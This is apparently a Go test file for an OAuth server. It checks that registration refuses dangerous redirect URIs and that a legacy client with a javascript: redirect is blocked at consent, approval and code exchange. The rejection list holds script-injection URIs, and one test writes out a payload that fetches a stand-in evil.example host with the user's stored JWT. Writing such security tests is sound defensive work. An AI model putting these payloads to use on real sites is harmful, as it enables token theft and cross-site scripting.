package oauth

// Against the database: the redirect uri rules (redirect_uri.go) at
// registration, and on every step a client registered before them takes.

import (
	"context"
	"errors"
	"testing"

	"github.com/urnetwork/connect/v2026"
	"github.com/urnetwork/server/v2026"
)

// Registration refused only http off loopback for a native client, so a
// redirect the browser runs itself registered as "native".
func TestRegisterClientRefusesSchemesTheBrowserRuns(t *testing.T) {
	server.DefaultTestEnv().Run(t, func(t testing.TB) {
		ctx := context.Background()

		for _, redirectUri := range []string{
			"javascript:alert(1)",
			"javascript:alert(document.domain)//",
			"data:text/html,<script>alert(1)</script>",
			"vbscript:msgbox(1)",
			"file:///etc/passwd",
			"about:blank",
			"blob:https://ur.io/0b6e4a7c",
			"invalid",
			"//evil.example/cb",
			"urn:ietf:wg:oauth:2.0:oob",
		} {
			// inferred native, and declared native
			for _, applicationType := range []string{"", ApplicationTypeNative} {
				_, err := RegisterClient(ctx, &clientMetadataDocument{
					ClientName:      "Claude",
					ApplicationType: applicationType,
					RedirectUris:    []string{"https://client.example/callback", redirectUri},
				})
				if err == nil {
					t.Errorf("registered a client with redirect %q (application type %q)", redirectUri, applicationType)
				}
			}
		}

		// the forms clients use still register, and match
		for _, redirectUri := range []string{
			"https://client.example/callback",
			"http://127.0.0.1:8976/callback",
			"com.example.app:/oauth/callback",
			"workbuddy://workbuddy/mcp/custom-mcp%3Aurnetwork/oauth/callback",
		} {
			client, err := RegisterClient(ctx, &clientMetadataDocument{
				RedirectUris: []string{redirectUri},
			})
			connect.AssertEqual(t, err, nil)
			connect.AssertEqual(t, client.ValidRedirectUri(redirectUri), true)
		}
	})
}

// A client registered with a javascript: redirect before the rules cannot use
// it: the consent screen's validation and the approval refuse it, and a code
// minted for it before the rules is not exchanged.
func TestRegisteredJavascriptRedirectIsRefusedAtEveryStep(t *testing.T) {
	server.DefaultTestEnv().Run(t, func(t testing.TB) {
		ctx := context.Background()

		payload := "javascript:fetch('https://evil.example/?'+localStorage.byJwt)//"
		// saved as registration saved it before the rules
		client := createTestClient(t, ctx, ApplicationTypeNative, []string{payload})
		user := testAuthorizingUser(t, ctx)
		request := testAuthorizationRequest(client, []string{ScopeMcpRead})

		// what the consent page asks before it shows the screen
		_, err := ValidateAuthorizationRequest(ctx, request)
		connect.AssertEqual(t, errors.Is(err, ErrInvalidRedirect), true)

		// the approval mints nothing and remembers nothing
		_, err = Authorize(ctx, request, user)
		connect.AssertEqual(t, errors.Is(err, ErrInvalidRedirect), true)
		connect.AssertEqual(t, GetConsent(ctx, user.UserId, client.ClientId) == nil, true)

		// a code minted for the redirect before the rules
		code, err := CreateAuthorizationCode(ctx, &AuthorizationCode{
			ClientId:            client.ClientId,
			UserId:              user.UserId,
			NetworkId:           user.NetworkId,
			RedirectUri:         payload,
			CodeChallenge:       testCodeChallenge(),
			CodeChallengeMethod: PkceMethodS256,
			Resource:            testResource,
			Scopes:              []string{ScopeMcpRead},
			AuthTime:            server.NowUtc(),
		})
		connect.AssertEqual(t, err, nil)
		_, err = ExchangeCode(ctx, &ExchangeCodeArgs{
			Code:         code,
			ClientId:     client.ClientId,
			RedirectUri:  payload,
			CodeVerifier: testCodeVerifier,
			Resource:     testResource,
		})
		connect.AssertEqual(t, err != nil, true)
	})
}
